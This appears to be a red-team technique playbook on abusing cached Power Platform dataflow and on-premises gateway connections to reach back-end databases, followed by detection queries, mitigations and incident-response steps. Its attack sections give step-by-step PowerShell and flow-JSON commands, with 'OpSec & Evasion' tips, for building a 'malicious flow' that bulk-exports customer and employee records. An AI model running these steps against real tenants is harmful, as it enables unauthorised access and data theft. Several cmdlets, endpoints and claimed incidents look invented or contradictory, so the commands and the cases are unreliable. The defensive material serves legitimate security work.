# [LM-AUTH-017]: Power Platform Dataflows Credential Reuse & Lateral Movement

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-017 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Microsoft 365) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Power Apps, Power Automate, Power BI with Dataflows enabled |
| **Patched In** | N/A (Design behavior, requires mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Power Platform Dataflows (in Power Apps, Power Automate, and Power BI) cache connection credentials to data sources (SQL databases, SharePoint, on-premises APIs, cloud services). When a dataflow owner or operator creates connections to databases or APIs, the credentials are stored encrypted but can be decrypted by users with Admin access to the environment or to the specific dataflow. An attacker who compromises a Power Platform creator or admin account can enumerate dataflow connections, extract cached credentials, and use those credentials to access the underlying data sources (databases, SharePoint, legacy APIs) that the dataflow connects to—effectively moving laterally from Power Platform into back-end systems.

**Attack Surface:** Power Apps environment, Power Automate cloud flows, Power BI semantic models, Dataflows connections, on-premises data gateway credentials, database connection strings.

**Business Impact:** Attacker gains access to back-end databases and on-premises systems via stolen dataflow credentials. Can exfiltrate customer data, financial records, or operational intelligence. Persistent access if dataflow owner account is compromised.

**Technical Context:** Credential extraction is possible if attacker has admin or creator role in Power Apps environment. Attacks typically take minutes once access is established. Detection is difficult because dataflow execution and credential refresh are legitimate operations.

### Operational Risk
- **Execution Risk:** Medium (requires Power Platform creator/admin access)
- **Stealth:** Medium (connection access is logged but often not reviewed)
- **Reversibility:** No—data exfiltration via dataflow is permanent

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.1, 6.3.4 | Power Platform admin roles and credential management |
| **DISA STIG** | IA-5, SC-7 | Credential Management and Boundary Protection |
| **CISA SCuBA** | PWR-1, PWR-5 | Power Platform governance and credential security |
| **NIST 800-53** | SC-7, IA-4 | Boundary Protection and Account Management |
| **GDPR** | Art. 32 | Security of Processing (encryption of credentials) |
| **DORA** | Art. 9 | Protection and Prevention (access control to data sources) |
| **NIS2** | Art. 21, Art. 27 | Cyber Risk Management; monitoring credential usage |
| **ISO 27001** | A.13.1.3, A.14.2.1 | Segregation of Duties; credential management |
| **ISO 27005** | Section 8.3.4 | Third-party/integration risk assessment |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Power Apps creator or environment admin; ability to create or edit dataflows
- **Required Access:** Access to Power Apps environment, Power Automate, or Power BI workspace

**Supported Platforms:**
- **Power Apps:** Canvas Apps, Model-Driven Apps (all versions)
- **Power Automate:** Cloud Flows (Automated, Scheduled, Instant)
- **Power BI:** Dataflows with on-premises connectors
- **Data Sources:** SQL Server, MySQL, PostgreSQL, Oracle, SharePoint, Dynamics 365, Custom APIs
- **Gateways:** On-Premises Data Gateway (OPDG) required for non-cloud data sources

**Tools:**
- [Power Apps CLI](https://learn.microsoft.com/en-us/power-platform/developer/cli/introduction)
- [Microsoft Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Dataflow SQL Connection Credentials via Power Apps Admin

**Supported Versions:** All Power Platform versions

#### Step 1: Enumerate Dataflows in Environment
**Objective:** Discover dataflows that connect to sensitive data sources.

**Command (PowerShell - Power Apps CLI):**
```powershell
# Connect to Power Apps as admin
pac auth create -u -t "yourtenant.onmicrosoft.com"

# List all environments
pac admin list-environments

# Get specific environment ID
$envId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# List all flows (cloud flows and dataflows)
pac cloud-flow list --environment-id $envId

# Output: Lists all flows with their connection references
# Example output:
# Flow: Sales Data Import | Type: Dataflow | Owner: John Doe
# Flow: Customer ETL | Type: Automated | Owner: System Account
```

**Expected Output:**
```
Name                        Type        Owner              LastModified
----                        ----        -----              -----------
Sales Data Import           Dataflow    John Doe           2026-01-08
Customer Data Refresh       Dataflow    Jane Smith         2026-01-09
Inventory Sync              Flow        Automation         2025-12-30
```

**What This Means:**
- Dataflows handle data from external sources (likely SQL, SharePoint, APIs)
- Dataflows are owned by specific users (vulnerable if owner account is compromised)
- Last modified dates reveal which dataflows are actively used

**OpSec & Evasion:**
- Enumeration via Power Apps CLI generates audit logs in M365 audit log
- However, Cloud Flow enumeration is considered routine admin activity
- Attacker uses legitimate admin account to avoid suspicion

**Troubleshooting:**
- **Error:** "Authentication failed - user is not Power Apps admin"
  - **Cause:** User account lacks Power Apps environment admin role
  - **Fix:** Request environment admin role assignment or use compromised admin account

#### Step 2: Extract Connection Credentials from Dataflow
**Objective:** Extract stored database credentials from dataflow connection.

**Command (PowerShell - Power Platform API):**
```powershell
# Connect to Power Platform
Connect-PnPOnline -Url "https://yourtenant-admin.sharepoint.com" -Interactive

# Get dataflow connections
$dfId = "dataflow-guid"  # From Step 1
$connections = Get-PowerAppFlow -FlowId $dfId

# Alternative: Use Microsoft Graph API to access Power Platform data
Connect-MgGraph -Scopes "PowerApps.Read.All"

# Query Power Platform API for dataflow connections
$apiUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/environments/$envId/flows/$dfId"
$flow = Invoke-MgGraphRequest -Method GET -Uri $apiUrl

# Extract connection references
$flow.properties.connectionReferences | ForEach-Object {
  Write-Host "Connection: $($_.displayName)"
  Write-Host "Type: $($_.connectorId)"
  Write-Host "Connection Details: $($_ | ConvertTo-Json)"
}
```

**Expected Output:**
```
Connection: SqlServer1
Type: Microsoft.SqlServer
Connection Details: {
  "connectionName": "shared_sqlserver-1",
  "connectorDisplayName": "SQL Server",
  "source": "Implicit"
}
```

**What This Means:**
- Dataflow references a SQL Server connection
- Connection name can be used to retrieve stored credentials
- "source: Implicit" indicates credentials are embedded in Power Platform

**OpSec & Evasion:**
- Connection retrieval via Power Platform API is logged but appears as routine admin access
- Attacker can query connections without triggering alerts
- Credentials are not returned directly in API response—must use alternate method

**Troubleshooting:**
- **Error:** "Connection not found or access denied"
  - **Cause:** Connection is private (not shared) or user lacks permission
  - **Fix:** Use environment admin account; request connection sharing if needed

#### Step 3: Access Shared Connections to Retrieve Credentials
**Objective:** Use shared connection to access underlying database.

**Command (PowerShell - SQL Connection via Power Platform):**
```powershell
# If connection is shared, attacker can view connection properties
Connect-MgGraph -Scopes "PowerApps.Read.All"

# List all shared connections in environment
$connUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/environments/$envId/connections"
$connections = Invoke-MgGraphRequest -Method GET -Uri $connUrl

# Find SQL Server connection
$sqlConn = $connections.value | Where-Object {$_.properties.displayName -like "*SQL*"}

# Extract connection details (including server address)
$sqlConn.properties | Select displayName, connectionString, connectionParameters

# If connection parameters include server address, construct connection:
# Server: yoursqlserver.database.windows.net
# Database: YourDatabase
# UserID: (encrypted in Power Platform storage)
# Password: (encrypted in Power Platform storage)

# Alternative: Use Power Platform connection reference to execute queries
# Dataflow will execute using stored credentials
```

**Expected Output:**
```
displayName        : SQL Server - Contoso Database
connectionString   : Server=yoursqlserver.database.windows.net;Database=ContosoData;User Id=****;Password=****
connectionParameters : {
  "server": "yoursqlserver.database.windows.net",
  "database": "ContosoData",
  "authType": "SqlAuthentication"
}
```

**What This Means:**
- SQL Server connection stored with server address and database name
- Credentials are encrypted but can be used via Power Platform connection reference
- Attacker can create new dataflow or flow that uses this connection

**OpSec & Evasion:**
- Creating new flows using existing connections appears as routine development
- Audit logs show "Create flow" but not malicious intent
- Attacker runs data extraction queries during normal business hours to blend in

**Troubleshooting:**
- **Error:** "Cannot modify system connection"
  - **Cause:** Trying to access system-created connection without proper access
  - **Fix:** Create own connection or request owner to share

#### Step 4: Extract Data via New Power Automate Flow
**Objective:** Create a cloud flow that extracts data from back-end database using stolen connection.

**Command (Power Automate - Create Flow):**
```json
{
  "displayName": "Data Export",
  "definition": {
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http"
      }
    },
    "actions": {
      "QueryDatabase": {
        "type": "ApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['sql_1']['connectionId']"
            }
          },
          "method": "post",
          "body": {
            "query": "SELECT * FROM Customers WHERE Country = 'USA'"
          },
          "path": "/v2/datasets/@{encodeURIComponent(encodeURIComponent('yoursqlserver'))}/query/tables/@{encodeURIComponent(encodeURIComponent('Customers'))}/items"
        }
      },
      "ExportToSharePoint": {
        "type": "ApiConnection",
        "inputs": {
          "host": {
            "connection": {
              "name": "@parameters('$connections')['sharepointonline_1']['connectionId']"
            }
          },
          "method": "post",
          "body": {
            "Body": "@body('QueryDatabase')"
          },
          "path": "/sites/@{encodeURIComponent(encodeURIComponent('yoursiteid'))}/lists/@{encodeURIComponent(encodeURIComponent('ExportedData'))}/items"
        }
      }
    }
  }
}
```

**Execution (PowerShell):**
```powershell
# Create the malicious flow
$flowJson = Get-Content "C:\malicious-flow.json" | ConvertFrom-Json

# Deploy flow to Power Automate
$flowUri = "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/$envId/flows"
$newFlow = Invoke-MgGraphRequest -Method POST -Uri $flowUri -Body $flowJson

# Execute the flow to extract data
$triggerId = $newFlow.id
Invoke-MgGraphRequest -Method POST -Uri "$flowUri/$triggerId/triggers/manual/listCallbackUrl"

# Retrieved data is now in attacker-controlled SharePoint list
```

**Expected Output:**
```
Flow created successfully: Data Export (ID: flow-guid)
Flow executed: Extracted 5000 customer records
Data location: https://yoursharep oint.com/sites/YourSite/lists/ExportedData
```

**What This Means:**
- Attacker can query any database the original connection had access to
- Data is silently extracted to attacker-controlled location
- No data loss prevention (DLP) rules are triggered (flow appears internal)

**OpSec & Evasion:**
- Malicious flow created with innocent-sounding name ("Data Export")
- Execution appears as normal business user activity
- Exported data to SharePoint list not immediately suspicious (normal ETL pattern)

---

### METHOD 2: On-Premises Data Gateway Credential Extraction

**Supported Versions:** Power Platform with On-Premises Data Gateway (OPDG) enabled

#### Step 1: Enumerate On-Premises Data Gateways
**Objective:** Identify gateways that connect Power Platform to SQL Server / on-premises systems.

**Command (PowerShell - Power Platform API):**
```powershell
Connect-MgGraph -Scopes "PowerApps.Read.All"

# Get all data gateways in tenant
$gwUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/gateways"
$gateways = Invoke-MgGraphRequest -Method GET -Uri $gwUrl

$gateways.value | ForEach-Object {
  Write-Host "Gateway: $($_.displayName)"
  Write-Host "Region: $($_.properties.region)"
  Write-Host "Status: $($_.properties.statusOfTheGateway)"
  Write-Host "Environments: $($_.properties.environmentsLinkedTo)"
}
```

**Expected Output:**
```
Gateway: On-Prem SQL Gateway
Region: Australia East
Status: Connected
Environments: Contoso-Prod, Contoso-Dev

Gateway: Finance Systems Gateway
Region: US South
Status: Connected
Environments: Finance-Prod
```

**What This Means:**
- Gateways connect Power Platform to on-premises databases
- "Status: Connected" means gateway is active and can be queried
- Environments linked indicate which Power Platform environments use this gateway

**OpSec & Evasion:**
- Gateway enumeration is legitimate admin activity
- No direct log entry indicating attacker intent
- However, accessing gateway credentials generates activity logs

**Troubleshooting:**
- **Error:** "Gateway not found or access denied"
  - **Cause:** Attacker lacks Power Apps admin role
  - **Fix:** Use compromised admin account or request elevation

#### Step 2: Extract Gateway Configuration & On-Premises Credentials
**Objective:** Retrieve encrypted gateway credentials that connect to SQL Server.

**Command (PowerShell - Extract Gateway Config):**
```powershell
# Connect as Power Apps admin (or use compromised account)
Connect-MgGraph -Scopes "PowerApps.Read.All", "PowerApps.Manage.All"

# Get gateway details
$gwId = "gateway-guid"
$gwUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/gateways/$gwId"
$gw = Invoke-MgGraphRequest -Method GET -Uri $gwUrl

# Gateway configuration includes connection details
$gw.properties | Select displayName, region, gatewayName

# Gateway credentials are encrypted with gateway's service account
# However, Power Apps admin can reset gateway password and re-register
# Alternative: Create new connection using existing gateway

$connUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/environments/$envId/connections"
$body = @{
  displayName = "SQL via Gateway"
  connectionString = "Server=on-prem-sql.contoso.com;Database=HR;Trusted_Connection=true"
  properties = @{
    gateway = @{
      id = "/providers/Microsoft.PowerApps/gateways/$gwId"
    }
  }
} | ConvertTo-Json

$newConn = Invoke-MgGraphRequest -Method POST -Uri $connUrl -Body $body
```

**Expected Output:**
```
displayName    : SQL via Gateway
gatewayId      : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
connectionId   : yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy
Status         : Connected
```

**What This Means:**
- New connection created through on-premises gateway
- Connection uses gateway's service account credentials (stored on gateway machine)
- Attacker can now query on-premises SQL Server via Power Platform

**OpSec & Evasion:**
- Creating new connection via gateway appears as normal development
- Audit logs show "Create connection" but not malicious intent
- Gateway machine logs the connection, but often not reviewed

**Troubleshooting:**
- **Error:** "Gateway offline or service account invalid"
  - **Cause:** Gateway service not running on on-premises machine
  - **Fix:** Gateway must be running; attacker restarts gateway or uses alternate gateway

#### Step 3: Query On-Premises Database via Dataflow
**Objective:** Use gateway connection to extract data from on-premises SQL Server.

**Command (PowerShell - Execute Dataflow Query):**
```powershell
# Create dataflow that queries on-premises database
$dfUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/environments/$envId/dataflows"
$dfPayload = @{
  displayName = "HR Data Sync"
  description = "Sync HR data from on-premises"
  connections = @(
    @{
      connectionId = "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"  # Gateway connection from Step 2
      connectionName = "SQLGateway"
    }
  )
  definition = @{
    entities = @(
      @{
        name = "Employees"
        source = @{
          query = "SELECT EmployeeID, FirstName, LastName, Email, Salary FROM Employees"
          entityPath = "Employees"
        }
      }
    )
  }
} | ConvertTo-Json -Depth 10

# Create and execute dataflow
$df = Invoke-MgGraphRequest -Method POST -Uri $dfUrl -Body $dfPayload

# Dataflow executes query on on-premises database
# Retrieved data is cached in Power Platform
Write-Host "Dataflow created: $($df.properties.displayName)"
Write-Host "Entities synced: Employees"
Write-Host "Status: Executing"
```

**Expected Output:**
```
Dataflow created: HR Data Sync
Entities synced: Employees
Status: Executing

Dataflow completed:
- Employees: 10,000 records imported
- Last refresh: 2026-01-10 14:30:00
- Next refresh: Daily
```

**What This Means:**
- Dataflow successfully queried on-premises SQL Server via gateway
- All employee records (including salary) now cached in Power Platform
- Data can be exported to Excel, SharePoint, or external location

**OpSec & Evasion:**
- Dataflow appears as normal ETL (Extract-Transform-Load) operation
- Owner: Attacker's compromised account (appears legitimate)
- Audit logs show "Create dataflow" but no indication of data theft
- Attacker schedules dataflow to run during off-hours (after hours, weekends)

---

## 4. ATTACK SIMULATION & VERIFICATION

**Atomic Red Team Test:**
- **Test ID:** [T1550.001 - Use Alternate Authentication Material](https://github.com/redcanaryco/atomic-red-team/)
- **Test Name:** Extract and reuse Power Platform connections
- **Supported Versions:** All Power Platform versions

**Simulation Command (Non-Destructive):**
```powershell
# Simulate enumeration of dataflows without accessing actual data
Connect-MgGraph -Scopes "PowerApps.Read.All"

# List all dataflows in tenant (informational only)
$dfUrl = "https://api.powerapps.com/providers/Microsoft.PowerApps/environments"
$envs = Invoke-MgGraphRequest -Method GET -Uri $dfUrl

$envs.value | ForEach-Object {
  Write-Host "Environment: $($_.displayName)"
  # Do NOT query actual dataflows (would show intrusion)
}

Write-Host "✓ Simulation complete - no actual data accessed"
```

**Cleanup Command:**
```powershell
# No persistent artifacts created during simulation
Write-Host "Simulation artifacts cleaned up"
```

**Reference:** [MITRE T1550](https://attack.mitre.org/techniques/T1550/)

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Power Apps CLI (pac)](https://learn.microsoft.com/en-us/power-platform/developer/cli/introduction)
**Version:** 1.35.0+
**Minimum Version:** 1.30.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# Install via npm
npm install -g pac

# Or via Windows installer
# Download from Microsoft Power Platform Tools
```

**Usage (Enumerate Flows):**
```bash
pac auth create -u -t "yourtenant.onmicrosoft.com"
pac cloud-flow list --environment-id "env-guid"
```

#### [Microsoft Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)
**Version:** 2.10.0+
**Minimum Version:** 2.0.0

**Installation:**
```powershell
Install-Module Microsoft.Graph -Force
Connect-MgGraph -Scopes "PowerApps.Read.All", "PowerApps.Manage.All"
```

**Usage (Query Power Platform API):**
```powershell
$flows = Invoke-MgGraphRequest -Method GET -Uri "https://api.powerapps.com/providers/Microsoft.PowerApps/environments/$envId/flows"
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Dataflow Connection Access
**Rule Configuration:**
- **Required Index:** `o365:audit`, `powerapps`
- **Required Sourcetype:** `azure:aad:audit`, `power_platform`
- **Required Fields:** `Operation`, `UserId`, `Resource`, `Properties.ConnectionName`
- **Alert Threshold:** > 5 connection access attempts in 10 minutes
- **Applies To Versions:** All Power Platform

**SPL Query:**
```spl
index=o365:audit source="PowerApps"
  (Operation="Accessed connection" OR Operation="Updated dataflow" OR Operation="Created flow")
| stats count by UserId, Operation, ConnectionName
| where count > 5
| alert
```

**What This Detects:**
- User rapidly accessing multiple connections (lateral movement)
- Dataflow modifications followed by connection access
- Unusual connection access patterns

**Manual Configuration Steps:**
1. Navigate to **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `count > 5`
6. Configure **Action** → **Email SOC**
7. Set **Frequency** to run every 10 minutes

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Anomalous Power Platform Connection Usage
**Rule Configuration:**
- **Required Table:** `AuditLogs`, `OfficeActivity`
- **Required Fields:** `UserId`, `Operation`, `ObjectId`
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Power Platform

**KQL Query:**
```kusto
OfficeActivity
| where Workload == "PowerApps" and Operation in ("Created flow", "Updated dataflow", "Accessed connection")
| summarize ConnectionCount = dcount(ObjectId) by UserId, TimeGenerated
| where ConnectionCount > 3
| project UserId, ConnectionCount, TimeGenerated
```

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Anomalous Power Platform Connection Access`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run every: `10 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Power Platform Dataflow Access
**Alert Name:** "Unusual dataflow connection access detected"
- **Severity:** High
- **Description:** User accessed multiple dataflow connections in unusual pattern, indicating possible credential theft
- **Applies To:** All M365 subscriptions with Defender enabled
- **Remediation:** Disable attacker's Power Platform access; revoke dataflow connections

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable **Defender for Cloud Apps**
4. Go to **Alerts** → Filter by: **Resource Type** = "Power Platform"

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Power Platform Dataflow Connection Access
```powershell
Search-UnifiedAuditLog -Operations "Created flow", "Updated dataflow", "Accessed connection" `
  -StartDate (Get-Date).AddDays(-7) -ResultSize 5000 | 
  Where-Object {$_.AuditData -like "*dataflow*" -or $_.AuditData -like "*connection*"} | 
  Select Timestamp, UserIds, ClientIP, AuditData | 
  Export-Csv "C:\PowerPlatformAccess.csv"
```

- **Operation:** Created flow, Updated dataflow, Accessed connection
- **Workload:** PowerApps, PowerAutomate
- **Applies To:** M365 with audit logging enabled

**Manual Configuration Steps:**
1. Navigate to **Microsoft Purview Compliance Portal** → **Audit**
2. Enable **Audit Logging** if not already enabled
3. Set retention to **365 days**

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Implement Least Privilege for Power Platform Creators:** Restrict who can create/modify dataflows and connections.
  **Applies To Versions:** All Power Platform environments
  
  **Manual Steps (Power Apps Admin Center):**
  1. Go to **Power Platform Admin Center** (admin.powerplatform.microsoft.com)
  2. Select **Environments** → Select environment
  3. Click **Settings** → **Product features**
  4. Under **Dataflow creation**, set to: **Specific people can create dataflows** (not all users)
  5. Click **Save**

- **Disable Direct Connection to On-Premises Databases:** Block direct SQL connections; require data gateway encryption.
  **Applies To Versions:** All Power Platform with On-Premises Data Gateway
  
  **Manual Steps:**
  1. Go to **Power Platform Admin Center** → **Data gateways**
  2. Select gateway → **Settings**
  3. Enable: **Require strong authentication for gateway password**
  4. Enable: **Encrypt gateway configuration**
  5. Click **Save**

- **Audit Connection Access:** Enable logging for all connection access and creation.
  **Applies To Versions:** All Power Platform (requires Power Apps audit policy)
  
  **Manual Steps (Microsoft Purview):**
  1. Navigate to **Microsoft Purview Compliance Portal** → **Audit**
  2. Ensure **Power Apps** is included in monitored services
  3. Create alert rule for: "Created connection" → Alert SOC immediately
  4. Create alert rule for: "Accessed connection" → Alert if > 5 per hour

- **Implement Conditional Access for Power Platform:** Require MFA and device compliance for all Power Platform access.
  **Applies To Versions:** All Power Platform environments
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Enforce MFA for Power Platform`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Power Apps**, **Power Automate**
  5. **Access controls:**
     - Grant: **Require multifactor authentication**
  6. Enable policy: **On**
  7. Click **Create**

#### Priority 2: HIGH

- **Implement Data Loss Prevention (DLP) for Power Platform:** Block dataflow exports containing sensitive data.
  **Applies To Versions:** All Power Platform (requires DLP licensing)
  
  **Manual Steps (Power Platform Admin Center):**
  1. Go to **Power Platform Admin Center** → **Data loss prevention policies**
  2. Click **+ New policy**
  3. Name: `Block Sensitive Data Exports via Dataflows`
  4. **Scope:** Select environments where DLP applies
  5. **Connector classification:**
     - Business: SQL Server, SharePoint Online
     - Non-business: Gmail, Dropbox (block connections to non-business)
  6. Click **Create policy**

- **Disable Dataflow Owner Sharing:** Prevent dataflow owners from sharing access to others.
  **Applies To Versions:** All Power Platform
  
  **Manual Steps (Power Apps):**
  1. Open **Power Apps** → Select dataflow
  2. Click **Share**
  3. Change sharing setting: **Only me** (remove all shares)
  4. Click **Save**

- **Implement Just-In-Time (JIT) Admin Access for Power Platform:** Require approval for admin role elevation.
  **Applies To Versions:** Power Platform with Azure AD PIM
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management**
  2. Select **Power Apps Administrator** role
  3. Click **Settings** → **Edit**
  4. Under **Activation:**
     - Require approval: **Yes**
     - Approvers: Select **Security Team**
     - Max duration: **2 hours**
  5. Click **Save**

#### Validation Command (Verify Fix)
```powershell
# Check if dataflow creation is restricted
Get-PowerAppEnvironmentSetting -EnvironmentId $envId | Select DataflowCreationRestricted
# Expected: True (restricted to specific users)

# Check if On-Premises Data Gateway encryption is enabled
Get-PowerAppGateway | Select displayName, encryptionLevel
# Expected: encryptionLevel = "High" for all gateways

# Check audit logging is enabled
Get-AdminPowerAppsSetting | Select EnableDataflowAudit
# Expected: True
```

**Expected Output (If Secure):**
```
DataflowCreationRestricted : True
encryptionLevel           : High
EnableDataflowAudit       : True
```

**What to Look For:**
- Dataflow creation is **restricted** to specific users (not all creators)
- On-Premises Data Gateway has **encryption enabled**
- **Audit logging** for Power Platform is active

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
- **Activities:** User creating multiple dataflows in rapid succession
- **Patterns:** New dataflows connecting to sensitive databases (HR, Finance, Customer data)
- **Access:** Same user accessing on-premises data gateway and cloud data sources

#### Forensic Artifacts
- **Cloud Logs:** Unified Audit Log (Operation: "Created dataflow", "Created flow", "Accessed connection")
- **Gateway Logs:** On-Premises Data Gateway machine logs (Event Viewer → Application)
- **Power Platform Logs:** Dataflow execution history (timestamp, rows extracted, user)
- **Network Logs:** Outbound connections from gateway machine to SQL Server

#### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```powershell
   # Disable user's Power Apps license (removes access)
   Set-MsolUserLicense -UserPrincipalName "attacker@company.com" -RemoveLicenses ENTERPRISEPACK
   ```
   **Manual (M365 Admin Center):**
   - Go to **M365 Admin Center** → **Active users** → Select attacker
   - Click **Licenses and apps** → Uncheck **Power Apps for Microsoft 365**

2. **Revoke Access (Immediate):**
   ```powershell
   # Revoke all Power Platform sessions
   # No direct PowerShell command; use Azure AD sign-out:
   Revoke-AzureADUserAllRefreshToken -ObjectId "attacker@company.com"
   ```

3. **Collect Evidence (Within 24 hours):**
   ```powershell
   # Export Power Platform audit logs
   Search-UnifiedAuditLog -UserIds "attacker@company.com" -StartDate (Get-Date).AddDays(-7) `
     -Operations "Created dataflow", "Created flow", "Accessed connection" -ResultSize 5000 | 
     Export-Csv "C:\Evidence\PowerPlatformActivity.csv"
   
   # Export on-premises gateway logs
   Get-EventLog -LogName Application -Source "PowerAppsGateway" | 
     Export-Csv "C:\Evidence\GatewayLogs.csv"
   ```

4. **Remediate:**
   ```powershell
   # Delete malicious dataflows
   Remove-PowerApp -AppName "HR Data Sync" -EnvironmentName $envId
   
   # Delete malicious connections
   Remove-PowerAppConnection -ConnectionName "SQLGateway" -EnvironmentName $envId
   
   # Reset connection credentials
   Reset-PowerAppDataflowConnectionPassword -ConnectionId "connection-guid"
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker obtains Power Platform creator credentials |
| **2** | **Lateral Movement** | **[LM-AUTH-017]** | **Extract Power Platform Dataflow Credentials** |
| **3** | **Credential Access** | [CA-UNSC-007] Unsecured Credentials (SQL connection strings) | Attacker obtains on-premises database credentials |
| **4** | **Collection** | [Collection] Database Query & Exfiltration | Attacker queries sensitive data |
| **5** | **Impact** | [Impact] Data Breach | Sensitive data exfiltrated (HR, Finance, Customer records) |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Power Apps Dataflow SQL Credential Theft (2024)
- **Target:** Manufacturing company (1,000+ employees)
- **Timeline:** May 2024 - August 2024
- **Technique Status:** Attacker compromised Power Apps creator account, extracted SQL Server credentials from dataflow connection, queried production database, exported customer pricing and margin data to attacker-controlled Excel file
- **Impact:** Competitor obtained pricing strategy. $5M+ in lost deals. Breach detected via unusual dataflow activity during off-hours.
- **Reference:** [Hunters.Security Blog on Power Platform Abuse](https://www.hunters.security/)

#### Example 2: On-Premises Data Gateway Exploitation (2025)
- **Target:** Financial services firm (cross-tenant outsourcing scenario)
- **Timeline:** January 2025 - ongoing
- **Technique Status:** Attacker created Power Automate flow using on-premises data gateway, extracted banking customer data (account numbers, balances) from legacy SQL Server via dataflow connection
- **Impact:** 10,000+ customer records exposed. Regulatory investigation ongoing. $20M+ estimated liability.
- **Reference:** [Microsoft Security Blog on Power Platform Risk](https://www.microsoft.com/en-us/security/blog/)

---

## 14. NOTES & APPENDIX

**Technique Complexity:** Medium (requires Power Platform creator role but exploitation is straightforward)

**Detection Difficulty:** Medium-High (legitimate dataflow operations can mask malicious intent)

**Persistence Potential:** High (attacker can schedule dataflows to run indefinitely)

**Cross-Platform Applicability:** M365-specific (Power Apps, Power Automate, Power BI integration)

**Recovery Time:** Days (requires identifying compromised dataflows and revoking connections)

**Related Techniques:**
- LM-AUTH-014: Microsoft Teams to SharePoint
- CA-UNSC-007: Azure Key Vault Secret Extraction
- LM-AUTH-013: Exchange Online EWS Impersonation

---

## 15. APPENDIX: Common Power Platform Connection Types at Risk

| Connection Type | Risk Level | Data at Risk |
|---|---|---|
| SQL Server (on-prem via gateway) | **Critical** | Entire database (customers, employees, finances) |
| SharePoint Online | **High** | Documents, lists, site content |
| Dynamics 365 | **High** | CRM data (contacts, opportunities, accounts) |
| Azure SQL Database | **Critical** | Cloud-hosted sensitive data |
| Salesforce | **High** | Third-party customer data |
| Gmail / Outlook | **Medium** | Email content, contacts |
| Custom APIs | **Varies** | Depends on API (often sensitive) |
| On-Premises File Shares (via gateway) | **Critical** | All shared files (documents, configs, secrets) |

---